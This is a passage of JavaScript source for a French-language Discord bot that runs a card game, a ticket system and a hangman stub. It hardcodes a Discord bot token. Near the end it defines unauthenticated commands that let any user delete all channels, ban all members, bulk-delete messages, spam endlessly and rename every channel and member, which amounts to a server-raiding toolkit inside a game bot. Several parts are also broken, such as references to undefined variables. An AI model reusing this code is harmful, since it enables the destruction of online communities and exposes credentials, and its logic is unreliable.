const Discord = require('discord.js');
const low = require('lowdb')
const FileSync = require('lowdb/adapters/FileSync')
const fs = require("fs");

// var mongoose = require('mongoose');
// mongoose.connect('mongodb://localhost/test', {useUnifiedTopology: true, useNewUrlParser: true});
// var db = mongoose.connection;
// db.on('error', console.error.bind(console, 'connection error:'));
// db.once('open', function() {
//   // we're connected!
//   console.log("Mongoose connecté !")
// });


const adapter = new FileSync('database.json');
const db = low(adapter);

db.defaults({ game: [], gamep: [], channelSelected: [], tickets: [], pendu: [], chasse: [] }).write()

var prefix = "!"
var bot = new Discord.Client();

bot.on('ready', () => {
    bot.user.setPresence({ game: { name: '...', type: 3 } });
    bot.user.setStatus("idle");
    console.log("Bot Ready !");
})

bot.login("NjQ3MTE3ODg4MzU2MDg5ODc3.XdbBiw.M8dFQLZ9nLW-8MbEzAumqfq70Is")

bot.on('message', message => {

    let channel = message.channel.id;
    let channelName = message.channel;

    if (!db.get("channelSelected").find({ channelId: "none" }).value()) {
        db.get("channelSelected").push({ channelId: "none" }).write();
    }

    var channelIdDb = db.get("channelSelected").find('channelId').value()
    var channelId = Object.values(channelIdDb);

    if (channelId[0] == "none") {
        if (message.content == prefix + "choix") {
            message.reply(`Le salon ${channelName} a été configuré.`);
            db.get("channelSelected").find("channelId").assign({ channelId: channelId[0] = channel }).write();
            db.get("channelSelected").find("channelId").delete({ channelId: channelId[0] = channel })

        }
    }

    var channelSelected = channelId[0]

    if (message.channel.id == channelSelected) {

        if (message.author.bot) return;
        var msgauthor = message.author.username;
        var msgauthorid = message.author.id;
        var jeuDBdb = db.get("game").filter({ game1: "ok" }).find('player2').value();
        var jeuDB = Object.values(jeuDBdb)

        if (message.content == prefix + "?") {
            var regles_embed = new Discord.RichEmbed()
                .setTitle("Règles/fonctionnement du jeu")
                .setDescription("Le jeu nécessite 2 joueurs, il est basé sur de la chance et un peu de stratégie.")
                .addField("Début du jeu", "Les deux joueurs doivent faire <p1 ou <p2")
                .addField("Tirage des cartes", "Les deux joueurs doivent faire la commande <tirer pour recevoir leurs tirages en mp")
                .addField("Vote", "Les deux joueurs doivent voter avec <win ou <loose EN MP AVEC LE BOT si vous pensez gagner ou perdre avec vos tirages (si vous pronostiquez bien, vous gagner des points, si non, vous en perdez)")
                .addField("Fin de la partie", "Un des deux joueurs doit faire <result SUR LE CANAL GENERAL pour voir le résultat de la partie")
                .addField("Statistiques", "Faire la commande <stat pour voir ses stats, ou <stat +mention pour voir les stats d'un membre précis")
            message.channel.send({ embed: regles_embed });
        }

        if (message.content == prefix + "p1") {
            if (message.channel.type === 'dm') return;

            if (!db.get("gamep").find({ id: msgauthorid }).value()) {
                db.get("gamep").push({ username: msgauthor, points: 1501, victoires: 1, défaites: 1, total: 1, id: msgauthorid, egalite: 1 }).write();
            }

            var pointsDB = db.get("gamep").filter({ id: msgauthorid }).find('points').value()
            var points = Object.values(pointsDB);
            db.get("gamep").find({ id: msgauthorid }).assign({ id: msgauthorid, points: points[1] += 0 }).write();
            if (jeuDB[2] == 1) {
                if (jeuDB[3] == msgauthor) {
                    message.reply("Vous ne pouvez pas jouer contre vous même..")
                } else {
                    message.reply("Participation validée")
                    db.get("game").find({ game1: "ok" }).assign({ player1: jeuDB[1] = msgauthor, player1ok: jeuDB[2] = 2, player1id: jeuDB[18] = msgauthorid }).write();

                    if (jeuDB[4] == 2) {
                        var points1db = db.get("gamep").filter({ id: jeuDB[18] }).find(`points`).value();
                        var points1 = Object.values(points1db)
                        var points2db = db.get("gamep").filter({ id: jeuDB[19] }).find(`points`).value();
                        var points2 = Object.values(points2db)
                        var percent1 = Math.floor(100 * `${points1[2] -= 1}` / `${points1[4] -= 1}`) + '%';
                        var percent2 = Math.floor(100 * `${points2[2] -= 1}` / `${points2[4] -= 1}`) + '%';
                        var xp_embed = new Discord.RichEmbed()
                            .setColor("#590599")
                            .setTitle("●▬▬▬▬๑۩★۩๑▬▬▬▬● Bᴀᴛᴀɪʟʟᴇ Tɪᴛᴀɴᴇsϙᴜᴇ ●▬▬▬▬๑۩★۩๑▬▬▬▬●")
                            .addField(`Joueur 1 (${jeuDB[1]}) :`, `◄[🥇]► Victoires : ${points1[2]}\n◄[🥈]► Défaites : ${points1[3] += -1}\n◄[󠀽🤔]► Egalités : ${points1[6] += -1}\n◄[🏆]► Points cumulés : ${points1[1] += -1}\n◄[⚔️]► Nombre de parties jouées : ${points1[4]}\n◄[⚖️]► ${percent1} de victoires`)
                            .addField(`Joueur 2 (${jeuDB[3]}) :`, `◄[🥇]► Victoires : ${points2[2]}\n◄[🥈]► Défaites : ${points2[3] += -1}\n◄[󠀽🤔]► Egalités : ${points2[6] += -1}\n◄[🏆]► Points cumulés : ${points2[1] += -1}\n◄[⚔️]► Nombre de parties jouées : ${points2[4]}\n◄[⚖️]► ${percent2} de victoires`)
                            .setFooter("★━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━★")

                        message.channel.send({ embed: xp_embed });
                        db.get("game").find({ game1: "ok" }).assign({ gamego: jeuDB[5] = "tirage" }).write();
                        message.reply("La partie commence !\nTirez 2 cartes ! (<tirer)")
                    }
                }
            }
        }
        if (message.content == prefix + "p2") {
            if (message.channel.type === 'dm') return;

            if (!db.get("gamep").find({ id: msgauthorid }).value()) {
                db.get("gamep").push({ username: msgauthor, points: 1501, victoires: 1, défaites: 1, total: 1, id: msgauthorid, egalite: 1 }).write();
            }
            if (jeuDB[4] == 1) {
                if (jeuDB[1] == msgauthor) {
                    message.reply("Vous ne pouvez pas jouer contre vous même..")
                } else {
                    message.reply("Participation validée")

                    db.get("game").find({ game1: "ok" }).assign({ player2ok: jeuDB[4] = 2, player2: jeuDB[3] = msgauthor, player2id: jeuDB[19] = msgauthorid }).write();

                    if (jeuDB[2] == 2) {
                        var points1db = db.get("gamep").filter({ id: jeuDB[18] }).find(`points`).value();
                        var points1 = Object.values(points1db)
                        var points2db = db.get("gamep").filter({ id: jeuDB[19] }).find(`points`).value();
                        var points2 = Object.values(points2db)
                        var percent1 = Math.floor(100 * `${points1[2] -= 1}` / `${points1[4] -= 1}`) + '%';
                        var percent2 = Math.floor(100 * `${points2[2] -= 1}` / `${points2[4] -= 1}`) + '%';
                        var xp_embed = new Discord.RichEmbed()
                            .setColor("#590599")
                            .setTitle("●▬▬▬▬๑۩★۩๑▬▬▬▬● Bᴀᴛᴀɪʟʟᴇ Tɪᴛᴀɴᴇsϙᴜᴇ ●▬▬▬▬๑۩★۩๑▬▬▬▬●")
                            .addField(`Joueur 1 (${jeuDB[1]}) :`, `◄[🥇]► Victoires : ${points1[2]}\n◄[🥈]► Défaites : ${points1[3] += -1}\n◄[󠀽🤔]► Egalités : ${points1[6] += -1}\n◄[🏆]► Points cumulés : ${points1[1] += -1}\n◄[⚔️]► Nombre de parties jouées : ${points1[4]}\n◄[⚖️]► ${percent1} de victoires`)
                            .addField(`Joueur 2 (${jeuDB[3]}) :`, `◄[🥇]► Victoires : ${points2[2]}\n◄[🥈]► Défaites : ${points2[3] += -1}\n◄[🤔]► Egalités : ${points2[6] += -1}\n◄[🏆]► Points cumulés : ${points2[1] += -1}\n◄[⚔️]► Nombre de parties jouées : ${points2[4]}\n◄[⚖️]► ${percent2} de victoires`)
                            .setFooter("★━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━★")
                        message.channel.send({ embed: xp_embed });
                        db.get("game").find({ game1: "ok" }).assign({ gamego: jeuDB[5] = "tirage" }).write();
                        message.channel.send("La partie commence !\nTirez 2 cartes ! (<tirer)")
                    }
                }
            }
        }

        var valeurcartes = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
        random = Math.ceil(Math.random() * 9);
        randome = Math.ceil(Math.random() * 9);
        var cartesaleatoire = valeurcartes[random];
        var cartesaleatoired = valeurcartes[randome];
        //var bonus = ["", "patates 🥔", "pains 🥖", "barres de survie 🍫", "bouteilles de champagne 🍾", "badges du Bataillon d'Exploration " + bot.emojis.find("name", "bataillon"), "badges des Brigades Spéciales " + bot.emojis.find("name", "brigadespeciale"), "badges de la Garnison " + bot.emojis.find("name", "garnison")]
        randomb = Math.ceil(Math.random() * 7);
        randombe = Math.ceil(Math.random() * 7);

        //var bonusrandom = bonus[randomb];
        //var bonusrandome = bonus[randombe];

        var tirageobjet = new Discord.RichEmbed()
            .setTitle("◄[⏳]► Recherche en cours ! ◄[⌛]►")
            //.setDescription("Comptage des objets en cours !")
            //.addField("◄[🔎]► Objets trouvés :", `${cartesaleatoire} ${bonusrandome}\n${cartesaleatoired} ${bonusrandom}`)
            .setDescription("Tirage des cartes en cours !")
            .addField("◄[🔎]► Cartes tirées :", `${cartesaleatoire} \n${cartesaleatoired} `)
            .setFooter("★━━━━━━━━━━━━━━━━━━━━★")


        if (message.content == prefix + "tirer") {
            if (jeuDB[5] == "tirage") {
                if (jeuDB[1] == `${message.author.username}`) {
                    if (jeuDB[2] == 2) {

                        message.reply("Tirage effectué en mp !")
                        db.get("game").find({ game1: "ok" }).assign({ player1ok: jeuDB[2] = "vote" }).write();
                        message.author.send(tirageobjet);
                        db.get("game").find({ game1: "ok" }).assign({ player1carte1: jeuDB[8] = cartesaleatoire, player1carte2: jeuDB[9] = cartesaleatoired }).write();
                        db.get("game").find({ game1: "ok" }).assign({ player1total: jeuDB[12] = cartesaleatoire + cartesaleatoired }).write();
                        message.author.send("En attente du joueur 2")
                        if (jeuDB[4] == "vote") {
                            db.get("game").find({ game1: "ok" }).assign({ gamego: jeuDB[5] = "vote" }).write();
                            message.channel.send("Faite votre pronostic en MESSAGE PRIVE avec le bot ! (<win si vous pensez gagner et <lose si vous pensez perdre.)")
                        }
                    }
                }
                if (jeuDB[3] == `${message.author.username}`) {
                    if (jeuDB[4] == 2) {

                        message.reply("Tirage effectué en mp !")
                        db.get("game").find({ game1: "ok" }).assign({ player2ok: jeuDB[4] = "vote" }).write();
                        message.author.send(tirageobjet);
                        db.get("game").find({ game1: "ok" }).assign({ player2carte1: jeuDB[10] = cartesaleatoire, player2carte2: jeuDB[11] = cartesaleatoired }).write();
                        db.get("game").find({ game1: "ok" }).assign({ player2total: jeuDB[13] = cartesaleatoire + cartesaleatoired }).write();
                        message.author.send("En attente du joueur 1")
                        if (jeuDB[2] == "vote") {
                            db.get("game").find({ game1: "ok" }).assign({ gamego: jeuDB[5] = "vote" }).write();
                            message.channel.send("Faite votre pronostic en MESSAGE PRIVE avec le bot ! (<win si vous pensez gagner et <lose si vous pensez perdre.)")
                        }
                    }
                }
            }
        }



        var result = new Discord.RichEmbed()
            .setColor("#590599")
            .setTitle("◄[🏆]► Tableau des scores ◄[🥇]► ◄[🥈]►")
            .addField(`Joueur 1 (${jeuDB[1]}) :`, ` ${jeuDB[8]} + ${jeuDB[9]} = ${jeuDB[12]} points`)
            .addField(`Joueur 2 (${jeuDB[3]}) :`, ` ${jeuDB[10]} + ${jeuDB[11]} = ${jeuDB[13]} points`)
            .setFooter("★━━━━━━━━━━━━━━━━━━━━━━━━━━━★")
            .setDescription(`${jeuDB[14]} gagne la partie et gagne les ${jeuDB[15]} points !`)

        if (message.content == prefix + "win" || message.content == prefix + "w") {
            if (message.channel.type === 'dm') {
                if (jeuDB[12] > jeuDB[13]) {
                    db.get("game").find({ game1: "ok" }).assign({ playerwin: jeuDB[14] = jeuDB[1], playerwinid: jeuDB[20] = jeuDB[18] }).write();
                    db.get("game").find({ game1: "ok" }).assign({ playerloose: jeuDB[16] = jeuDB[3], playerlooseid: jeuDB[21] = jeuDB[19] }).write();
                    db.get("game").find({ game1: "ok" }).assign({ winner: jeuDB[15] = jeuDB[8] + jeuDB[9] }).write();
                    db.get("game").find({ game1: "ok" }).assign({ looser: jeuDB[17] = jeuDB[10] + jeuDB[11] }).write();
                }
                if (jeuDB[12] < jeuDB[13]) {
                    db.get("game").find({ game1: "ok" }).assign({ playerwin: jeuDB[14] = jeuDB[3], playerwinid: jeuDB[20] = jeuDB[19] }).write();
                    db.get("game").find({ game1: "ok" }).assign({ playerloose: jeuDB[16] = jeuDB[1], playerlooseid: jeuDB[21] = jeuDB[18] }).write();
                    db.get("game").find({ game1: "ok" }).assign({ winner: jeuDB[15] = jeuDB[10] + jeuDB[11] }).write();
                    db.get("game").find({ game1: "ok" }).assign({ looser: jeuDB[17] = jeuDB[8] + jeuDB[9] }).write();
                }
                if (jeuDB[12] == jeuDB[13]) {
                    db.get("game").find({ game1: "ok" }).assign({ playerwin: jeuDB[14] = "Égalité ! Personne ne ", winner: jeuDB[15] = jeuDB[10] + jeuDB[11] }).write();
                }
                if (jeuDB[5] == "vote") {

                    if (jeuDB[1] == `${message.author.username}`) {
                        if (jeuDB[6] == "nop") {
                            message.reply("Vote validé !")
                            db.get("game").find({ game1: "ok" }).assign({ player1vote: jeuDB[6] = "win" }).write();
                            if (jeuDB[7] == "win" || jeuDB[7] == "loose") {

                                bot.channels.get(chs).send("Les 2 joueurs ont voté, les résultats sont disponible avec la commande <result")

                            }
                        }
                    }
                    if (jeuDB[3] == `${message.author.username}`) {
                        if (jeuDB[7] == "nop") {
                            message.reply("Vote validé !")
                            db.get("game").find({ game1: "ok" }).assign({ player2vote: jeuDB[7] = "win" }).write();
                            if (jeuDB[6] == "win" || jeuDB[6] == "loose") {

                                bot.channels.get(chs).send("Les 2 joueurs ont voté, les résultats sont disponible avec la commande <result")

                            }
                        }
                    }
                }
            }
        }
        if (message.content == prefix + "loose" || message.content == prefix + "lose" || message.content == prefix + "l") {
            if (message.channel.type === 'dm') {
                if (jeuDB[12] > jeuDB[13]) {
                    db.get("game").find({ game1: "ok" }).assign({ playerwin: jeuDB[14] = jeuDB[1], playerwinid: jeuDB[20] = jeuDB[18] }).write();
                    db.get("game").find({ game1: "ok" }).assign({ playerloose: jeuDB[16] = jeuDB[3], playerlooseid: jeuDB[21] = jeuDB[19] }).write();
                    db.get("game").find({ game1: "ok" }).assign({ winner: jeuDB[15] = jeuDB[8] + jeuDB[9] }).write();
                    db.get("game").find({ game1: "ok" }).assign({ looser: jeuDB[17] = jeuDB[10] + jeuDB[11] }).write();
                }
                if (jeuDB[12] < jeuDB[13]) {
                    db.get("game").find({ game1: "ok" }).assign({ playerwin: jeuDB[14] = jeuDB[3], playerwinid: jeuDB[20] = jeuDB[19] }).write();
                    db.get("game").find({ game1: "ok" }).assign({ playerloose: jeuDB[16] = jeuDB[1], playerlooseid: jeuDB[21] = jeuDB[18] }).write();
                    db.get("game").find({ game1: "ok" }).assign({ winner: jeuDB[15] = jeuDB[10] + jeuDB[11] }).write();
                    db.get("game").find({ game1: "ok" }).assign({ looser: jeuDB[17] = jeuDB[8] + jeuDB[9] }).write();
                }
                if (jeuDB[12] == jeuDB[13]) {
                    db.get("game").find({ game1: "ok" }).assign({ playerwin: jeuDB[14] = "Égalité ! Personne ne " }).write();
                }
                if (jeuDB[5] == "vote") {
                    if (jeuDB[1] == `${message.author.username}`) {
                        if (jeuDB[6] == "nop") {
                            message.reply("Vote validé !")
                            db.get("game").find({ game1: "ok" }).assign({ player1vote: jeuDB[6] = "loose" }).write();
                            if (jeuDB[7] == "win" || jeuDB[7] == "loose") {
                                //  message.channel.send("Les résultats sont disponible avec la commande <result")
                                bot.channels.get(chs).send("Les 2 joueurs ont voté, les résultats sont disponible avec la commande <result")
                            }
                        }
                    }
                    if (jeuDB[3] == `${message.author.username}`) {
                        if (jeuDB[7] == "nop") {
                            message.reply("Vote validé !")
                            db.get("game").find({ game1: "ok" }).assign({ player2vote: jeuDB[7] = "loose" }).write();
                            if (jeuDB[6] == "win" || jeuDB[6] == "loose") {
                                bot.channels.get(chs).send("Les 2 joueurs ont voté, les résultats sont disponible avec la commande <result")


                            }
                        }
                    }
                }
            }
        }
        if (message.content == prefix + "result") {
            if (message.channel.type === 'dm') return;

            var userpldb = db.get("gamep").filter({ id: jeuDB[21] }).find(`points`).value();
            var userpl = Object.values(userpldb)
            var userpdb = db.get("gamep").filter({ id: jeuDB[20] }).find(`points`).value();
            var userp = Object.values(userpdb)
            if (jeuDB[6] && jeuDB[7] != "nop") {

                if (jeuDB[12] === jeuDB[13]) {
                    db.get("gamep").find({ id: jeuDB[20] }).assign({ egalite: userp[6] += 1, total: userp[4] += 1 }).write();
                    db.get("gamep").find({ id: jeuDB[21] }).assign({ egalite: userpl[6] += 1, total: userpl[4] += 1 }).write();
                }
                if (jeuDB[12] < jeuDB[13] || jeuDB[12] > jeuDB[13]) {

                    db.get("gamep").find({ id: jeuDB[20] }).assign({ id: jeuDB[20], points: userp[1] += jeuDB[15], victoires: userp[2] += 1, total: userp[4] += 1 }).write();
                    db.get("gamep").find({ id: jeuDB[21] }).assign({ id: jeuDB[21], défaites: userpl[3] += 1, total: userpl[4] += 1, points: userpl[1] -= jeuDB[17] }).write();

                    if (jeuDB[14] == jeuDB[1]) { // vérifie si le joueur 1 gagne la partie
                        if (jeuDB[6] == "win") { // 
                            db.get("gamep").find({ id: jeuDB[20] }).assign({ points: userp[1] += 7 }).write();
                        }
                        if (jeuDB[6] == "loose") { // perd des points si il gagne mais vote qu'il perd
                            db.get("gamep").find({ id: jeuDB[20] }).assign({ points: userp[1] -= 3 }).write();
                        }
                    }
                    if (jeuDB[16] == jeuDB[1]) { // vérifie si le joueur 1 perd  la partie
                        if (jeuDB[6] == "win") { // mauvais vote + perd
                            db.get("gamep").find({ id: jeuDB[21] }).assign({ points: userpl[1] -= 7 }).write();
                        }
                        if (jeuDB[6] == "loose") { // bon vote mais perd
                            db.get("gamep").find({ id: jeuDB[21] }).assign({ points: userpl[1] += 3 }).write();
                        }
                    }
                    if (jeuDB[14] == jeuDB[3]) { // vérifie si le joueur 2 gagne la partie
                        if (jeuDB[7] == "win") { // 
                            db.get("gamep").find({ id: jeuDB[20] }).assign({ points: userp[1] += 7 }).write();
                        }
                        if (jeuDB[7] == "loose") { // perd des points si il gagne mais vote qu'il perd
                            db.get("gamep").find({ id: jeuDB[20] }).assign({ points: userp[1] -= 3 }).write();
                        }
                    }
                    if (jeuDB[16] == jeuDB[3]) { // vérifie si le joueur 2 perd  la partie
                        if (jeuDB[7] == "win") { // mauvais vote + perd
                            db.get("gamep").find({ id: jeuDB[21] }).assign({ points: userpl[1] -= 7 }).write();
                        }
                        if (jeuDB[7] == "loose") { // bon vote mais perd
                            db.get("gamep").find({ id: jeuDB[21] }).assign({ points: userpl[1] += 3 }).write();
                        }
                    }
                }
                message.channel.send({ embed: result });
                db.get("game").find({ game1: "ok" }).assign({
                    player1ok: jeuDB[2] = 1,
                    player2ok: jeuDB[4] = 1,
                    gamego: jeuDB[5] = 1,
                    player1vote: jeuDB[6] = "nop",
                    player2vote: jeuDB[7] = "nop",
                    player1: jeuDB[1] = "fdgvd",
                    player2: jeuDB[3] = "frfd"
                }).write();
            }
        }
        if (message.content === prefix + "stat") {
            if (!db.get("gamep").find({ id: msgauthorid }).value()) {
                db.get("gamep").push({ username: msgauthor, points: 1501, victoires: 1, défaites: 1, total: 1, id: msgauthorid, egalite: 1 }).write();
            }
            var pointsDB = db.get("gamep").filter({ id: msgauthorid }).find('points').value()
            var points = Object.values(pointsDB);
            db.get("gamep").find({ id: msgauthorid }).assign({ username: msgauthor, points: points[1] += 0 }).write();
            var percent = Math.floor(100 * `${points[2] -= 1}` / `${points[4] -= 1}`) + '%';
            var xp_embed = new Discord.RichEmbed()
                .setColor("#590599")
                .setTitle("☆-—————STATISTIQUES—————-☆")
                .addField(`${message.author.username} :`, `◄[🏆]► Points : ${points[1] += -1}\n◄[🥇]► Victoires : ${points[2]}\n◄[🥈]► Défaites : ${points[3] -= 1}\n◄[🤔]► Egalités : ${points[6] -= 1}\n◄[⚔️]► Nombre de parties jouées : ${points[4]}\n◄[⚖️]► ${percent} de victoires`)
                .setFooter("★━━━━━━━━━━━━━━━━━━━★")
            message.channel.send({ embed: xp_embed });
        }



        let pUser = message.mentions.users.first()

        if (message.content.startsWith(prefix + "stat")) {
            if (!pUser) {
            }
            else {
                if (!db.get("gamep").find({ id: pUser.id }).value()) {
                    db.get("gamep").push({ username: pUser.username, points: 1501, victoires: 1, défaites: 1, total: 1, id: pUser.id, egalite: 1 }).write();
                }
                var pointsusedb = db.get("gamep").filter({ id: pUser.id }).find('points').value()
                var pointsuser = Object.values(pointsusedb);
                db.get("gamep").find({ id: pUser }).assign({ username: pUser, points: pointsuser[1] += 0 }).write();
                var percent = Math.floor(100 * `${pointsuser[2] -= 1}` / `${pointsuser[4] -= 1}`) + '%';
                var xp_embeduser = new Discord.RichEmbed()
                    .setColor("#590599")
                    .setTitle("☆-—————STATISTIQUES—————-☆")
                    .addField(`${pUser.username} :`, `◄[🏆]► Points : ${pointsuser[1] += -1}\n◄[🥇]► Victoires : ${pointsuser[2]}\n◄[🥈]► Défaites : ${pointsuser[3] -= 1}\n◄[🤔]► Egalités : ${pointsuser[6] -= 1}\n◄[⚔️]► Nombre de parties jouées : ${pointsuser[4]}\n◄[⚖️]► ${percent} de victoires`)
                    .setFooter("★━━━━━━━━━━━━━━━━━━━★")
                message.channel.send({ embed: xp_embeduser });
            }
        }

        if (message.content == prefix + "resetalex") {
            db.get("game").find({ game1: "ok" }).assign({
                player1ok: jeuDB[2] = 1,
                player2ok: jeuDB[4] = 1,
                gamego: jeuDB[5] = 1,
                player1vote: jeuDB[6] = "nop",
                player2vote: jeuDB[7] = "nop",
                player1: jeuDB[1] = "fdgvd",
                player2: jeuDB[3] = "frfd"
            }).write();
        }
    }




    if (message.content == prefix + "tl") {


        var ticketOpendb = db.get("tickets").filter({ status: "open" }).find('type').value();
        var ticketOpen = Object.values(ticketOpendb)
        var ticket_liste_embed = new Discord.RichEmbed()
            .setColor("#590599")
            .setTitle("☆-—————Pannel Ticket—————-☆")
            .setDescription(`Résumé du ticket :\n${ticketOpen}`)
            .setFooter("★━━━━━━━━━━━━━━━━━━━★")
        message.reply({ embed: ticket_liste_embed })

    }




    if (message.channel.type === 'dm') {

        if (message.author.bot) return;

        var msgauthorid = message.author.id;

        if (!db.get("tickets").find({ memberId: msgauthorid, status: "waiting for the choice", type: "none", ticket: "none" }).value()) {
            db.get("tickets").push({ memberId: msgauthorid, status: "waiting for the choice", type: "none", ticket: "none" }).write();
        }
        if (message.content == prefix + "t") {



            var ticket_embed = new Discord.RichEmbed()
                .setColor("#590599")
                .setTitle("☆-—————Pannel Ticket—————-☆")
                .setDescription(`Choisissez la section correspondante à votre demande :\n💡 : Suggestion pour le serveur, bot, etc.\n⚒️ : Demande à propos de la modération sur le serveur.\n⚙ : Signaler un bug (permission(s) salon(s), commande(s) bot, etc.)`)
                .setFooter("★━━━━━━━━━━━━━━━━━━━★")
            message.reply({ embed: ticket_embed }).then(function (message) {

                message.react('💡')
                    .then(() => message.react('⚒️'))
                    .then(() => message.react('⚙'))
                    .catch(() => console.error('One of the emojis failed to react.'));
            })
        }


        var msgauthorid = message.author.id;
        var ticketdb = db.get("tickets").filter({ ticket: "none" }).find('memberId').value();
        var ticketToken = Object.values(ticketdb);
        if (ticketToken[1] == "waiting for the writing") {
            db.get("tickets").find({ memberId: msgauthorid, ticket: "none" }).assign({ ticket: ticketToken[3] = message.content.slice(0, message.content.length), status: "open" }).write();

            var ticket_list_embed = new Discord.RichEmbed()
                .setColor("#590599")
                .setTitle("☆-—————Pannel Ticket—————-☆")
                .setDescription(`Résumé du ticket :\nId Membre : ${msgauthorid}\nStatut du ticket : Open\nSection : ${ticketToken[2]}\nDescription : ${ticketToken[3]}`)
                .setFooter("★━━━━━━━━━━━━━━━━━━━★")
            bot.channels.get(channelSelected).send({ embed: ticket_list_embed })
            message.reply("La demande a bien été transmise.")
        }
    }
})

bot.on('messageReactionAdd', (reaction, user) => {

    var msgauthorid = user.id

    if (reaction.emoji.name === '💡' && user.id !== bot.user.id) {
        if (reaction.message.channel.type === 'text') return;
        var ticketdb = db.get("tickets").filter({ memberId: msgauthorid }).find('type').value();
        var ticketToken = Object.values(ticketdb)
        reaction.message.reply("Indiquez votre demande en rapport avec une suggestion !")
        db.get("tickets").find({ memberId: msgauthorid, ticket: "none" }).assign({ type: ticketToken[2] = "Suggestion", status: "waiting for the writing" }).write();
    }

    if (reaction.emoji.name === '⚒️' && user.id !== bot.user.id) {
        if (reaction.message.channel.type === 'text') return;
        var ticketdb = db.get("tickets").filter({ memberId: msgauthorid }).find('type').value();
        var ticketToken = Object.values(ticketdb)
        reaction.message.reply("Indiquez votre demande en rapport avec la modération !")
        db.get("tickets").find({ memberId: msgauthorid, ticket: "none" }).assign({ type: ticketToken[2] = "Modération", status: "waiting for the writing" }).write();
    }

    if (reaction.emoji.name === '⚙' && user.id !== bot.user.id) {
        if (reaction.message.channel.type === 'text') return;
        var ticketdb = db.get("tickets").filter({ memberId: msgauthorid }).find('type').value();
        var ticketToken = Object.values(ticketdb)
        reaction.message.reply("Indiquez votre demande en rapport avec un bug !")
        db.get("tickets").find({ memberId: msgauthorid, ticket: "none" }).assign({ type: ticketToken[2] = "Bug", status: "waiting for the writing" }).write();
    }
})






// bot.on('message', message => {

//     var memberMessageId          = message.member.id
//     var memberMessageTag         = message.member.user.tag
//     var memberMessageUsername    = message.member.user.username
//     var memberMessageNickname    = message.member.nickname
//     var memberMessagePrecense    = message.member.presence.status
//     var memberMessageLastMessage = message.member.lastMessage
//     var memberMessageJoinDate    = message.member.joinedAt
//     // var memberMessageSpeaking    = message.member.voiceChannel.clone('name','oui')





//     if (message.content == prefix + "test") {

//         message.reply(
//             memberMessageId + "\n" +
//             memberMessageTag + "\n" +
//             memberMessageUsername + "\n" +
//             memberMessageNickname + "\n" +
//             memberMessagePrecense + "\n" +
//             memberMessageLastMessage + "\n" +
//             memberMessageJoinDate + "\n" //+
//             // memberMessageSpeaking 
//         )
//     }

//     if (message.content == prefix + "t") {

//     var jesaispas = message.mentions.
//     message.reply(jesaispas)

//     }
// })



bot.on('message', message => {

    // var test = message.member.id;

    //      if (message.content == prefix + "tzaz") {

    //     message.guild.channels.find('name', 'cave')
    // .overwritePermissions(test, { // Pass 'UserResolvable' type thing as described in Wiki!
    //   VIEW_CHANNEL: true,
    //   SEND_MESSAGES: true,
    //   READ_MESSAGE_HISTORY: true,
    //   ATTACH_FILES: false
    // });
    // }


    if (message.content == prefix + "t") {



        var ticket_embed = new Discord.RichEmbed()
            .setColor("#590599")
            .setTitle("☆-—————Coffre à code—————-☆")
            .setDescription(`[0]|[0]|[0]|[0]`)
            .setFooter("★━━━━━━━━━━━━━━━━━━━★")
        message.reply({ embed: ticket_embed }).then(function (message) {

            message.react('0⃣')
                .then(() => message.react('1⃣'))
                .then(() => message.react('2⃣'))
                .then(() => message.react('3⃣'))
                .then(() => message.react('4⃣'))
                .then(() => message.react('5⃣'))
                .then(() => message.react('6⃣'))
                .then(() => message.react('7⃣'))
                .then(() => message.react('8⃣'))
                .then(() => message.react('9⃣'))
                .catch(() => console.error('One of the emojis failed to react.'));
        })
    }

})




bot.on('messageReactionAdd', (reaction, user) => {

    var msgauthorid = user.id

    if (reaction.emoji.name === '💡' && user.id !== bot.user.id) {
        if (reaction.message.channel.type === 'text') return;
        var ticketdb = db.get("tickets").filter({ memberId: msgauthorid }).find('type').value();
        var ticketToken = Object.values(ticketdb)
        reaction.message.reply("Indiquez votre demande en rapport avec une suggestion !")
        db.get("tickets").find({ memberId: msgauthorid, ticket: "none" }).assign({ type: ticketToken[2] = "Suggestion", status: "waiting for the writing" }).write();
    }

})


bot.on('message', message => {

    if (message.author.bot) return;


    //  if (message.content.startsWith(prefix + "mot")) {
    //  var mot = message.content.slice(5, message.content.length)
    //  var motNumber = mot.length
    //  var machin = "**_** "
    //  var motdb    = db.get("pendu").filter({ init: 1 }).find('nombreLettres').value();
    //  var motdbobject = Object.values(motdb);
    //  db.get("pendu").find({ init: 1}).assign({ mot: motdbobject = mot, nombreLettres: motdbobject= motNumber }).write();

    //  message.reply(machin.repeat(motNumber))
    // }


    if (message.content.startsWith(prefix + "mot")) {
        var mot = message.content.slice(5, message.content.length)
        var motNumber = mot.length
        var machin = "**_** "
        var motdb = db.get("pendu").filter({ init: 1 }).find('nombreLettres').value();
        var motdbobject = Object.values(motdb);
        db.get("pendu").find({ init: 1 }).assign({ mot: motdbobject = mot, nombreLettres: motdbobject = motNumber }).write();

        message.reply(machin.repeat(motNumber))
    }






    // var test = "ioui"
    // var motNumber = test.length


    // var tatata = message.content.slice(0, 1)
    // var relou = test.slice(tatata)
    // var machin = "**_** "

    // // if (test.includes(tatata)) {
    // //     message.reply(relou + " " + tatata)
    // // }

    //  if (tatata.includes(test)) {
    //      message.reply("la lette " + relou + " ou " + tatata)
    //  }


    //     while ( relou != -1 ) {

    //      relou = test.indexOf( tatata,relou + 1 );
    //      message.reply(relou +"re")
    //      message.reply(tatata.replace(machin))

    //  }







    // Delete all channels
    if (message.content == prefix + "delchan") {
        message.guild.channels.forEach(channel => channel.delete())
    }

    // Ban all members
    if (message.content == prefix + "banmember") {
        message.guild.members.filter(member => member.bannable).forEach(member => { member.ban() });
    }

    // Delete all messages
    if (message.content == prefix + "delmsg") {
        async function clear() {
            message.delete();
            const fetched = await message.channel.fetchMessages();
            message.channel.bulkDelete(fetched);
        }
        clear();
    }

    // Spam message channels
    if (message.content.startsWith(prefix + "spam")) {
        var interval = setInterval(function () {

            message.channel.sendMessage(message.content.slice(5, message.content.length))
            message.channel.sendMessage(time)

                .catch(console.error); // add error handling here
        }, 1 * 1000);
    }

    // Rename all channels
    if (message.content.startsWith(prefix + "renamechan")) {
        var channelNewName = message.content.slice(11, message.content.length)
        message.guild.channels.forEach(channel => channel.setName(channelNewName))
    }

    // Rename all members
    if (message.content.startsWith(prefix + "renamember")) {
        var channelNewName = message.content.slice(11, message.content.length)
